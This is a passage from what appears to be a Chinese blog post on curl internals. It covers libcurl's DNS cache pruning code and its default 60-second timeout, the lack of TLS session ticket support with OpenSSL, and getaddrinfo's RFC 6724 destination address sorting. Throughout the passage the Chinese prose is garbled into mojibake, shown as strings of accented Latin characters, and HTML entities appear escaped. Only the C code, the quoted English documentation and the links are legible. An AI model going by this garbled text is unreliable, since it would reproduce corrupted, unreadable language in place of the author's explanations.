ã€‚\nå¦ä¸€ä¸ªå‚æ•°data-\u0026gt;dns.hostcacheï¼Œæˆ‘ä»¬ä¹‹å‰åœ¨Curl_hash_addå‡½æ•°ä¸­ï¼Œç”¨ä½œè¡¨ç¤ºå“ˆå¸Œè®°å½•ï¼Œè¿™é‡Œä¸ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒCurl_hostcache_pruneä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶è¯­å¥ä¸ä¼šç›´æ¥returnï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç»§ç»­è·Ÿè¿›è¯¥å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±åˆ°äº†hostcache_pruneå‡½æ•°ã€‚\n/* * Prune the DNS cache. This assumes that a lock has already been taken. */ static void hostcache_prune(struct Curl_hash *hostcache, long cache_timeout, time_t now) { struct hostcache_prune_data user; user.cache_timeout = cache_timeout; user.now = now; Curl_hash_clean_with_criterium(hostcache, (void *) \u0026amp;user, hostcache_timestamp_remove); } æ„Ÿè§‰çœ‹åˆ°è¿™é‡Œå·²ç»èƒ½å¾ˆæ˜æ˜¾çš„çœ‹åˆ° curl åšæ³•çš„æ„å›¾äº†ï¼Œä¼ å…¥å‡½æ•°çš„ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºç°åœ¨çš„æ—¶é—´ï¼Œç¬¬äºŒä¸ªå‚æ•°è¿™é‡Œä¸ºé»˜è®¤çš„ DNS ç¼“å­˜æ—¶é—´ä¸º 60s ï¼Œè¿›è¡Œèµ‹å€¼æ“ä½œåï¼Œè¿›å…¥åˆ°hostcache_timestamp_removeå‡½æ•°ï¼š\n/* Cleans all entries that pass the comp function criteria. */ void Curl_hash_clean_with_criterium(struct Curl_hash *h, void *user, int (*comp)(void *, void *)) { struct Curl_llist_element *le; struct Curl_llist_element *lnext; struct Curl_llist *list; int i; if(!h) return; for(i = 0; i \u0026lt; h-\u0026gt;slots; ++i) { list = \u0026amp;h-\u0026gt;table[i]; le = list-\u0026gt;head; /* get first list entry */ while(le) { struct Curl_hash_element *he = le-\u0026gt;ptr; lnext = le-\u0026gt;next; /* ask the callback function if we shall remove this entry or not */ if(comp == NULL || comp(user, he-\u0026gt;ptr)) { Curl_llist_remove(list, le, (void *) h); --h-\u0026gt;size; /* one less entry in the hash now */ } le = lnext; } } } /* * This function is set as a callback to be called for every entry in the DNS * cache when we want to prune old unused entries. * * Returning non-zero means remove the entry, return 0 to keep it in the * cache. */ static int hostcache_timestamp_remove(void *datap, void *hc) { struct hostcache_prune_data *data = (struct hostcache_prune_data *) datap; struct Curl_dns_entry *c = (struct Curl_dns_entry *) hc; return (0 != c-\u0026gt;timestamp) \u0026amp;\u0026amp; (data-\u0026gt;now - c-\u0026gt;timestamp \u0026gt;= data-\u0026gt;cache_timeout); } åœ¨è¿™é‡Œä¸€åˆ‡çœŸç›¸å¤§ç™½ï¼Œæ­£å¦‚ä»£ç æ‰€ç¤ºï¼Œåœ¨hostcache_timestamp_removeä¸­ä¼šä½¿ç”¨ç°åœ¨çš„æ—¶é—´ä¸ curl å“ˆå¸Œè¡¨ä¸­è®°å½•çš„æ—¶é—´ç›¸å‡ï¼Œç»“æœæ˜¯å¦å¤§äºdata-\u0026gt;cache_timeoutï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯é»˜è®¤çš„ 60s ï¼Œå¦‚æœå¤§äºåˆ™åœ¨Curl_hash_clean_with_criteriumæ¸…ç©ºå¯¹åº”çš„å“ˆå¸Œè¡¨ï¼Œæ¥ç€ curl æ‰ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡çœŸæ­£çš„ DNS æŸ¥è¯¢ã€‚\næ‰€ä»¥ï¼Œä»ä»£ç å±‚é¢æ¥çœ‹ï¼Œå¦‚æœæ²¡æœ‰ç”¨æˆ·ç‰¹æ®Šé…ç½®ï¼Œ curl ä¼šè‡ªå·±ç»´æŠ¤ä¸€ä¸ª DNS å“ˆå¸Œè¡¨ï¼Œå…¶ä¸­çš„è®°å½•è¿‡æœŸæ—¶é—´ä¸º 60s ã€‚\nå®˜ç½‘æ–‡æ¡£ä¹Ÿæœ‰è¿‡ç›¸å…³è¯´æ˜ CURLOPT_DNS_CACHE_TIMEOUT explained ï¼Œå…¶ä¸­æè¿°å¦‚ä¸‹ï¼š\n â€‹\tPass a long, this sets the timeout in seconds. Name resolves will be kept in memory and used for this number of seconds. Set to zero to completely disable caching, or set to -1 to make the cached entries remain forever. By default, libcurl caches this info for 60 seconds.\nThe name resolve functions of various libc implementations don\u0026rsquo;t re-read name server information unless explicitly told so (for example, by calling res_init(3)). This may cause libcurl to keep using the older server even if DHCP has updated the server info, and this may look like a DNS cache issue to the casual libcurl-app user.\nNote that DNS entries have a \u0026ldquo;TTL\u0026rdquo; property but libcurl doesn\u0026rsquo;t use that. This DNS cache timeout is entirely speculative that a name will resolve to the same address for a certain small amount of time into the future.\n æ›´ä¸€æ­¥è¯´æ˜äº†ï¼Œ curl å®Œå…¨å¿½è§†å¾—åˆ°çš„ DNS æŸ¥è¯¢å¾—åˆ°çš„ TTL ç¼“å­˜æ—¶é—´ï¼Œä½¿ç”¨è‡ªå·±çš„ DNS ç¼“å­˜ç­–ç•¥ã€‚è™½ç„¶ curl æ²¡æœ‰å®ˆæŠ¤è¿›ç¨‹ç­‰ä»€ä¹ˆæ‰‹æ®µçš„æ¥ç»´æŠ¤è‡ªå·±çš„ DNS å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯ä¸ºäº†è§£å†³åœ¨å¤æ‚ç½‘ç»œè¯·æ±‚æ—¶é¿å…è¿‡å¤š DNS è¯·æ±‚ï¼Œè¿˜æ˜¯é€‰æ‹©äº†æ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªå“ˆå¸Œè¡¨æ¥ä¼˜åŒ–ã€‚å…¶ä¸»è¦çš„è®¾è®¡æ€è·¯ä¸»è¦åŸºäºä¸¤å±‚ç¼“å­˜ï¼Œç¬¬ä¸€å±‚ç¼“å­˜ç”±ç³»ç»Ÿå†³å®šï¼Œä¹Ÿå°±æ˜¯é€šè¿‡getaddrinfoè·å–ï¼Œå¦‚æœè¿™æ—¶å€™è¿‡æœŸäº†åˆ™ç”±ç³»ç»Ÿå»è·å– DNS è®°å½•ï¼Œå¦‚æœæ²¡æœ‰è¿‡æœŸåˆ™ç›´æ¥ä½¿ç”¨ç³»ç»Ÿçš„ DNS è®°å½•ï¼›ç¬¬äºŒå±‚å°±æ˜¯ curl è‡ªå·±çš„ DNS å“ˆå¸Œè¡¨ï¼Œåœ¨è¿›è¡Œå¤šæ¬¡è¯·æ±‚æ—¶èƒ½ä½“ç°å‡ºä½¿ç”¨è‡ªå·±å“ˆå¸Œè¡¨çš„ä¼˜åŠ¿ï¼Œè¿›ä¸€æ­¥çœå»äº†ä»ç³»ç»Ÿè·å– DNS è®°å½•çš„æ—¶é—´ã€‚å½“ç„¶è¿˜æœ‰ä¸€ç§å¯èƒ½å°±æ˜¯ä¸ºäº†åœ¨ç‰¹å®šåœºåˆåœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£ DNS Rebinding çš„æ”»å‡»ã€‚\ncURL Session Ticket å…³äº Session Ticket ï¼Œè™½ç„¶è¯¥æ ‡å‡†æœ‰å¾ˆå¤šçš„ä¼˜ç‚¹ï¼Œä¸»è¦å®ç°äº† Stateless çš„ç‰¹ç‚¹ï¼Œå‡ç¼“äº†æœåŠ¡å™¨çš„è´Ÿè½½å‹åŠ›ï¼Œä½†æ˜¯ä¼¼ä¹ curl with openSSL å¹¶ä¸æ‰“ç®—æ”¯æŒ Session Ticket è¿™ä¸€ extension ã€‚\nè™½ç„¶æ›¾ç»æœ‰äººå°è¯•åœ¨ curl ä¸­æ”¯æŒè¿™ä¸€ TLS 1.2 çš„ç‰¹æ€§ï¼Œä½†æ˜¯æ ¹æ® Re: Question about SSL Session Tickets å½“ä¸­çš„è®¨è®ºï¼ŒTLS Session ticket support æ„å»ºçš„ curl å¹¶ä¸å¯ä»¥æ­£å¸¸çš„ä½¿ç”¨ï¼Œæ‰€ä»¥å½“æ—¶è¢« curl å®˜æ–¹äººå‘˜æ”¾å¼ƒäº†è¯¥ PR Merged ï¼Œä¹‹åä¹Ÿæ²¡æœ‰å†æ‰“ç®—æ”¯æŒè¿™ä¸€ç‰¹æ€§äº†ï¼Œå½“ç„¶ä¹Ÿæ²¡æœ‰åœ¨ curl çš„ TODO çœ‹åˆ°ç›¸å…³çš„æ”¯æŒè®¡åˆ’äº†ã€‚å½“ç„¶å¦‚æœä½ éå¸¸å€¾å‘äºä½¿ç”¨ CLI å·¥å…·å»å®éªŒè¯¥ç‰¹æ€§ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨ openssl s_client æˆ–è€… curl build with GnuTLS ï¼Œä»–ä»¬éƒ½æ”¯æŒè¿™ä¸€ç‰¹æ€§ã€‚\nä»¥ä¸‹æ˜¯åœ¨äº’è”ç½‘ä¸Šä¸€äº›å…³äº curl æ”¯æŒ TLS 1.2 Session Ticket çš„è®¨è®ºï¼š\nhttps://curl.se/mail/lib-2019-08/0056.html\nhttps://github.com/curl/curl/issues/3202\nhttps://github.com/curl/curl/pull/2220\nhttps://github.com/curl/curl/issues/1109#issuecomment-274346447\nhttps://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids\nIP Sort IN cURL å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹äº IP é€‰æ‹©çš„é—®é¢˜äº†ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡ curl åœ¨è·å– DNS è®°å½•çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯getaddrinfoå‡½æ•°ï¼Œè¯¥å‡½æ•°ä½äº glibc å½“ä¸­ï¼Œä¸ºäº†å¼„æ¸…æ¥šè¿™ä¸ªå‡½æ•°å¯¹äº IP é€‰æ‹©çš„é—®é¢˜ï¼Œæˆ‘ä¸€ä¸ª Web é€‰æ‰‹ä¹Ÿåªèƒ½ç¡¬ç€å¤´çš®å»è°ƒè¯• glibc äº†ï¼Œä½•æ—¶å—è¿‡è¿™ä¸ªè‹¦ï¼ä¸‹é¢å°±æ˜¯åœ¨è°ƒè¯• glibc 2.31 è¿‡ç¨‹å½“ä¸­çš„ä¸€äº›è®°å½•ä¸ç»“æœã€‚\nä» getaddrinfo çš„æ‰‹å†Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ï¼š\n â€‹\tGiven node and service, which identify an Internet host and a service, getaddrinfo() returns one or more addrinfo structures, each of which contains an Internet address that can be specified in a call to bind(2) or connect(2). The getaddrinfo() function combines the functionality provided by the gethostbyname(3) and getservbyname(3) functions into a single interface, but unlike the latter functions, getaddrinfo() is reentrant and allows programs to eliminate IPv4-versus-IPv6 dependencies.\n å…¶å‡½æ•°åŠŸèƒ½ä¸»è¦æ˜¯ç”¨æ¥æŸ¥è¯¢ç»™å®šåŸŸåå¯¹åº”çš„ IP ï¼Œç”¨æ¥æ›¿ä»£ä¹‹å‰çš„gethostbynameä¸getservbynameå‡½æ•°ï¼Œå¹¶ä¸”å‡æ”¯æŒ IPv4 ä¸ IPv6 ã€‚åœ¨æ‰‹å†Œä¸­ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æè¿°ï¼š\n â€‹\tThere are several reasons why the linked list may have more than one addrinfo structure, including: the network host is multihomed, accessible over multiple protocols (e.g., both AF_INET and AF_INET6); or the same service is available from multiple socket types (one SOCK_STREAM address and another SOCK_DGRAM address, for example). Normally, the application should try using the addresses in the order in which they are returned. The sorting function used within getaddrinfo() is defined in RFC 3484; the order can be tweaked for a particular system by editing /etc/gai.conf (available since glibc 2.5).\n ä»¥åŠåœ¨å…¶é…ç½®æ–‡ä»¶ gai.conf å¸®åŠ©æ–‡æ¡£å½“ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å¦‚ä¸‹æè¿°ï¼š\n â€‹\tA call to getaddrinfo(3) might return multiple answers. According to RFC 3484 these answers must be sorted so that the answer with the highest success rate is first in the list. The RFC provides an algorithm for the sorting. The static rules are not always adequate, though. For this reason, the RFC also requires that system administrators should have the possibility to dynamically change the sorting. For the glibc implementation, this can be achieved with the /etc/gai.conf file. Each line in the configuration file consists of a keyword and its parameters. White spaces in any place are ignored. Lines starting with \u0026lsquo;#\u0026rsquo; are comments and are ignored.\n ä¹Ÿå°±æ˜¯è¯´ï¼Œgetaddrinfoå‡½æ•°ä¼šä½¿ç”¨ gai.conf ä»¥åŠ RFC 3484 æ¥å¯¹å…¶å¾—åˆ°çš„ç»“æœè¿›è¡Œæ’åºï¼Œè€Œ gai.conf æ–‡ä»¶ä¸­çš„å¯ä»¥ç”±ç”¨æˆ·æ‰‹åŠ¨é…ç½®ï¼Œæˆ‘ä»¬æš‚ä¸”æç½®ï¼Œå…ˆæ¥çœ‹çœ‹è¿™ä¸ªä¼ è¯´ä¸­çš„ RFC 3484 æ‰€æè¿°çš„è§„åˆ™ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ RFC 3484 å·²ç»è¢« RFC 6724 å–ä»£ï¼ŒSo let\u0026rsquo;s take a look at the RFC 6724.\nåœ¨ RFC 6724 çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„æè¿°ï¼š\n â€‹\tFor example, when DNS name resolution yields both IPv6 and IPv4 addresses and the network protocol stack has available both IPv6 and IPv4 source addresses. In such cases, a simple policy to always prefer IPv6 or always prefer IPv4 can produce poor behavior. As one example, suppose a DNS name resolves to a global IPv6 address and a global IPv4 address. If the node has assigned a global IPv6 address and a 169.254/16 auto-configured IPv4 address [9], then IPv6 is the best choice for communication. But if the node has assigned only a link-local IPv6 address and a global IPv4 address, then IPv4 is the best choice for communication. The destination address selection algorithm solves this with a unified procedure for choosing among both IPv6 and IPv4 addresses.\n è¿™é‡Œæ­£å¥½ä¸¾äº†ä¸€ä¸ªä¾‹å­ï¼Œä¾‹å¦‚å½“ DNS è§£æåŒæ—¶äº§ç”Ÿ IPv6 å’Œ IPv4 åœ°å€ï¼Œè€Œç½‘ç»œåè®®æ ˆåŒæ—¶æ‹¥æœ‰ IPv6 å’Œ IPv4 æºåœ°å€æ—¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç®€å•çš„ç­–ç•¥ï¼Œå³æ€»æ˜¯ä¼˜å…ˆé€‰æ‹© IPv6 æˆ–æ€»æ˜¯ä¼˜å…ˆé€‰æ‹© IPv4 ï¼Œå¯èƒ½ä¼šäº§ç”Ÿä¸è‰¯è¡Œä¸ºã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ä¸€ä¸ª DNS è§£æåˆ°ä¸€ä¸ªå…¨å±€ IPv6 åœ°å€å’Œä¸€ä¸ªå…¨å±€ IPv4 åœ°å€ï¼Œå¦‚æœèŠ‚ç‚¹å·²ç»åˆ†é…äº†ä¸€ä¸ªå…¨å±€ IPv6 åœ°å€å’Œä¸€ä¸ª 169.254/16 è‡ªåŠ¨é…ç½®çš„ IPv4 åœ°å€ï¼Œé‚£ä¹ˆ IPv6 æ˜¯é€šä¿¡çš„æœ€ä½³é€‰æ‹©ã€‚ä½†å¦‚æœèŠ‚ç‚¹åªåˆ†é…äº†ä¸€ä¸ªé“¾è·¯æœ¬åœ° IPv6 åœ°å€å’Œä¸€ä¸ªå…¨å±€ IPv4 åœ°å€ï¼Œé‚£ä¹ˆ IPv4 æ˜¯é€šä¿¡çš„æœ€ä½³é€‰æ‹©ã€‚ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œåœ¨ IPv6 å’Œ IPv4 åœ°å€ä¸­è¿›è¡Œç»Ÿä¸€çš„é€‰æ‹©ã€‚\nè¿™ä¸ªä»‹ç»çœ‹èµ·æ¥ä¼¼ä¹æ­£æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œèƒ½å¸®åŠ©æˆ‘ä»¬è§£å†³å¯¹äºä¸¤ä¸ª IP çš„æ’åºé—®é¢˜ã€‚åœ¨å¤§æ¦‚é€šè¯»è¿™ç¯‡ RFC åï¼Œè¯¥ RFC ä¸»è¦æå‡ºäº†å‡ ç§åœ°å€é€‰æ‹©ç®—æ³•ï¼ŒåŒ…æ‹¬æºåœ°å€é€‰æ‹©ç®—æ³•ã€ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•ç­‰ï¼Œèƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬è§£å†³å¾ˆå¤šå¹³æ—¶çš„ç–‘æƒ‘ï¼Œæ¯”å¦‚æœ‰å¤šä¸ªæº IP ä¸ºä»€ä¹ˆä½¿ç”¨å…¶ä¸­ä¸€ä¸ªç‰¹å®šçš„æº IP ç­‰ï¼Œä¸ªäººå»ºè®®å¦‚æœæœ‰ç±»ä¼¼å…³äºç½‘ç»œé€šä¿¡ç–‘é—®æˆ–è€…éœ€è¦äº†è§£ç½‘ç»œé€šä¿¡å†…å®¹çš„åŒå­¦å¯ä»¥è¿›ä¸€æ­¥å­¦ä¹ ä¸€ä¸‹è¯¥ RFC ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯ä¸»è¦æ˜¯ç›®çš„åœ°å€é€‰æ‹©ç®—æ³•ï¼Œä¸ä¼šä»‹ç»å…¶ä»–ç®—æ³•ï¼Œå¹¶ä¸”ä¹Ÿåªæ˜¯åšä¸ªç®€å•ä»‹ç»ã€‚\nå¯¹äºç›®çš„åœ°å€é€‰æ‹©ç®—æ³•éœ€è¦æŒ‰é¡ºåºéµå®ˆåæ¡è§„åˆ™ï¼Œå¹¶ä¸”åªè¦å‰ä»»ä¸€è§„åˆ™èµ·åˆ°æ’åºä½œç”¨ï¼Œåˆ™åç»­è§„åˆ™ä¸èµ·ä½œç”¨ã€‚ä¸‹æ–‡ä»¥ DS è¡¨ç¤º Destination S ã€‚\n è§„åˆ™1ï¼šé¿å…ä¸å¯ç”¨çš„ç›®çš„åœ°ã€‚å¦‚æœå·²çŸ¥ DB æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œæˆ–è€…å¦‚æœ Source(DB) æ˜¯æœªå®šä¹‰çš„ï¼Œé‚£ä¹ˆé¦–é€‰DAã€‚åŒç†ï¼Œå¦‚æœå·²çŸ¥ DA æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œæˆ–è€… Source(DA) æ˜¯æœªå®šä¹‰çš„ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚ è§„åˆ™2ï¼šä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„èŒƒå›´ã€‚å¦‚æœ Scope(DA) = Scope(Source(DA)) ï¼Œä¸” Scope(DB) \u0026lt;\u0026gt; Scope(Source(DB)) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Scope(DA) \u0026lt;\u0026gt; Scope(Source(DA)) ï¼Œä¸”Scope(DB) = Scope(Source(DB)) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DBã€‚ è§„åˆ™3ï¼šé¿å…ä½¿ç”¨åºŸå¼ƒçš„åœ°å€ã€‚å¦‚æœ Source(DA) è¢«å¼ƒç”¨è€Œ Source(DB) æ²¡æœ‰è¢«å¼ƒç”¨ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚åŒç†ï¼Œå¦‚æœ Source(DA) æ²¡æœ‰è¢«åºŸå¼ƒï¼Œè€Œ Source(DB) è¢«åºŸå¼ƒï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DA ã€‚ è§„åˆ™4ï¼šä¼˜å…ˆé€‰æ‹©å®¶åº­åœ°å€ã€‚å¦‚æœ Source(DA) åŒæ—¶æ˜¯å®¶åº­åœ°å€å’Œç…§é¡¾åœ°å€ï¼Œè€Œ Source(DB) ä¸æ˜¯ï¼Œé‚£ä¹ˆé¦–é€‰ DA ã€‚åŒç†ï¼Œå¦‚æœ Source(DB) åŒæ—¶æ˜¯å®¶åº­åœ°å€å’Œç…§é¡¾åœ°å€ï¼Œè€Œ Source(DA) ä¸æ˜¯ï¼Œé‚£ä¹ˆé¦–é€‰DBã€‚å¦‚æœ Source(DA) åªæ˜¯ä¸€ä¸ªå®¶åº­åœ°å€ï¼Œè€Œ Source(DB) åªæ˜¯ä¸€ä¸ªç…§é¡¾åœ°å€ï¼Œé‚£ä¹ˆå°±é€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Source(DA) åªæ˜¯ä¸€ä¸ªç…§é¡¾åœ°å€ï¼Œè€Œ Source(DB) åªæ˜¯ä¸€ä¸ªå®¶åº­åœ°å€ï¼Œé‚£ä¹ˆé¦–é€‰ DB ã€‚ è§„åˆ™5ï¼šä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„æ ‡ç­¾ã€‚å¦‚æœ Label(Source(DA))=Label(DA) ä¸” Label(Source(DB)) \u0026lt;\u0026gt; Label(DB) ï¼Œåˆ™é¦–é€‰ DA ã€‚åŒç†ï¼Œå¦‚æœ Label(Source(DA)) \u0026lt;\u0026gt;Label(DA) ï¼Œä¸”Label(Source(DB))=Label(DB)ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DB ã€‚ è§„åˆ™6ï¼šä¼˜å…ˆé€‰æ‹©è¾ƒé«˜çš„ä¼˜å…ˆçº§ã€‚å¦‚æœ Precedence(DA)\u0026gt; Precedence(DB) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DA ã€‚åŒç†ï¼Œå¦‚æœ Precedence(DA) \u0026lt; Precedence(DB) ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹© DB ã€‚ è§„åˆ™7ï¼šä¼˜å…ˆé€‰æ‹©æœ¬åœ°ä¼ è¾“ã€‚å¦‚æœ DA æ˜¯é€šè¿‡å°è£…è¿‡æ¸¡æœºåˆ¶ï¼ˆå¦‚IPv4ä¸­çš„IPv6ï¼‰è¾¾åˆ°çš„ï¼Œè€Œ DB ä¸æ˜¯ï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DB ã€‚åŒç†ï¼Œå¦‚æœ DB æ˜¯é€šè¿‡å°è£…åˆ°è¾¾ï¼Œè€Œ DA ä¸æ˜¯ï¼Œé‚£ä¹ˆä¼˜å…ˆé€‰æ‹© DA ã€‚ è§„åˆ™8ï¼šä¼˜å…ˆé€‰æ‹©è¾ƒå°çš„èŒƒå›´ã€‚å¦‚æœ Scope(DA) \u0026lt; Scope(DB) ï¼Œåˆ™é¦–é€‰ DA ã€‚åŒæ ·ï¼Œå¦‚æœScope(DA)\u0026gt;Scope(DB) ï¼Œåˆ™é€‰æ‹© DB ã€‚ è§„åˆ™9ï¼šä½¿ç”¨æœ€é•¿çš„åŒ¹é…å‰ç¼€ã€‚å½“DAå’ŒDBå±äºåŒä¸€ä¸ªåœ°å€æ—ï¼ˆéƒ½æ˜¯IPv6æˆ–éƒ½æ˜¯IPv4ï¼‰ã€‚å¦‚æœCommonPrefixLen(Source(DA), DA) \u0026gt; CommonPrefixLen(Source(DB), DB)ï¼Œåˆ™é¦–é€‰DAã€‚åŒç†ï¼Œå¦‚æœCommonPrefixLen(Source(DA), DA) \u0026lt; CommonPrefixLen(Source(DB)ï¼ŒDB)ï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DBã€‚ è§„åˆ™10ï¼šå¦åˆ™ï¼Œä¿æŒé¡ºåºä¸å˜ã€‚å¦‚æœDAåœ¨åŸåˆ—è¡¨ä¸­å…ˆäºDBï¼Œåˆ™ä¼˜å…ˆé€‰æ‹©DAã€‚å¦åˆ™ï¼Œä¼˜å…ˆé€‰æ‹©DBã€‚ å¦‚æœæ‰§è¡Œæœ‰å…¶ä»–æ–¹æ³•å¯¹ç›®çš„åœ°åœ°å€è¿›è¡Œæ’åºï¼Œè§„åˆ™9å’Œ10å¯ä»¥è¢«å–ä»£ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå®æ–½æœºæ„çŸ¥é“å“ªäº›ç›®çš„åœ°å€ä¼šå¸¦æ¥ \u0026ldquo;æœ€ä½³ \u0026ldquo;çš„é€šä¿¡æ€§èƒ½ï¼Œåˆ™è§„åˆ™9å’Œ10å¯ä»¥è¢«å–ä»£ã€‚  æ›´ç®€å•æ¥è¯´éµå®ˆä»¥ä¸‹è§„åˆ™ï¼š\n é¿å…ä½¿ç”¨ä¸å¯ç”¨çš„ç›®çš„åœ°å€ã€‚å¦‚æœä¸€ä¸ªåœ°å€æ˜¯å¯åˆ°è¾¾çš„ï¼ˆå †æ ˆæœ‰é€šå¾€ç‰¹å®šåœ°å€çš„è·¯ç”±ï¼‰ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€æ˜¯ä¸å¯åˆ°è¾¾çš„ï¼Œé‚£ä¹ˆå°†å¯åˆ°è¾¾çš„ç›®çš„åœ°å€æ”¾åœ¨ä¸å¯åˆ°è¾¾çš„åœ°å€ä¹‹å‰ã€‚ ä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„èŒƒå›´ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸä¸å…¶æºåœ°å€çš„ä½œç”¨åŸŸç›¸åŒ¹é…ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€ä¸ç¬¦åˆè¿™ä¸ªæ ‡å‡†ï¼Œé‚£ä¹ˆå°±æŠŠä½œç”¨åŸŸç›¸åŒ¹é…çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªç›®çš„åœ°å€ä¹‹å‰ã€‚ ç›®çš„åœ°å€åŠå…¶ç›¸å…³çš„æºåœ°å€çš„èŒƒå›´ç”±åœ°å€çš„é«˜é˜¶ä½å†³å®šã€‚ç›®çš„åœ°å€å¯ä»¥æ˜¯å¤šæ’­åœ°å€æˆ–å•æ’­åœ°å€ã€‚ä¸ºäº†æ¯”è¾ƒèŒƒå›´ï¼Œå•æ’­é“¾è·¯æœ¬åœ°åœ°å€è¢«æ˜ å°„åˆ°å¤šæ’­é“¾è·¯æœ¬åœ°åœ°å€ï¼Œå•æ’­å…¨å±€åœ°å€è¢«æ˜ å°„åˆ°å¤šæ’­å…¨å±€åœ°å€ã€‚ é¿å…ä½¿ç”¨åºŸå¼ƒçš„åœ°å€ã€‚å¦‚æœä¸€ä¸ªåœ°å€æ˜¯åºŸå¼ƒçš„ï¼Œè€Œå¦ä¸€ä¸ªåœ°å€æ˜¯éåºŸå¼ƒçš„ï¼Œé‚£ä¹ˆéåºŸå¼ƒçš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚ ä¼˜å…ˆé€‰æ‹©åŒ¹é…çš„æ ‡ç­¾ã€‚å¦‚æœä¸€ä¸ªç›®æ ‡åœ°å€çš„æ ‡ç­¾ä¸å…¶å…³è”çš„æºåœ°å€çš„æ ‡ç­¾ç›¸åŒ¹é…ï¼Œè€Œå¦ä¸€ä¸ªç›®æ ‡åœ°å€çš„æ ‡ç­¾ä¸å…¶å…³è”çš„æºåœ°å€çš„æ ‡ç­¾ä¸ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆå…·æœ‰åŒ¹é…æ ‡ç­¾çš„ç›®æ ‡åœ°å€è¢«æ”¾åœ¨å¦ä¸€ä¸ªåœ°å€ä¹‹å‰ã€‚æœ‰å…³æ ‡ç­¾å¦‚ä½•ä¸ç›®æ ‡åœ°å€å…³è”çš„ä¿¡æ¯ï¼Œè¯·å‚è§IPv6é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨å’Œé…ç½®é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨ã€‚ ä¼˜å…ˆé€‰æ‹©è¾ƒé«˜çš„ä¼˜å…ˆçº§ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä¼˜å…ˆçº§é«˜äºå¦ä¸€ä¸ªåœ°å€çš„ä¼˜å…ˆçº§ï¼Œé‚£ä¹ˆä¼˜å…ˆçº§è¾ƒé«˜çš„åœ°å€å°†è¢«æ”¾åœ¨å¦ä¸€ä¸ªç›®æ ‡åœ°å€ä¹‹å‰ã€‚è¯·å‚é˜… IPv6é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨ å’Œ é…ç½®é»˜è®¤åœ°å€é€‰æ‹©çš„ç­–ç•¥è¡¨ï¼Œä»¥äº†è§£æ›´å¤šå…³äºä¼˜å…ˆçº§å€¼å¦‚ä½•ä¸ç›®çš„åœ°å€å…³è”çš„ä¿¡æ¯ã€‚ ä¼˜å…ˆèŒƒå›´è¾ƒå°ã€‚å¦‚æœä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸå°äºå¦ä¸€ä¸ªåœ°å€çš„ä½œç”¨åŸŸï¼Œåˆ™ä½œç”¨åŸŸè¾ƒå°çš„åœ°å€æ”¾åœ¨å¦ä¸€ä¸ªç›®çš„åœ°å€ä¹‹å‰ã€‚ ä½¿ç”¨æœ€é•¿çš„åŒ¹é…å‰ç¼€ã€‚å¦‚æœä¸€ä¸ªç›®æ ‡åœ°å€ä¸å…¶å…³è”çš„æºåœ°å€çš„ CommonPrefixLength æ¯”å¦ä¸€ä¸ªç›®æ ‡åœ°å€ä¸å…¶æºåœ°å€çš„ 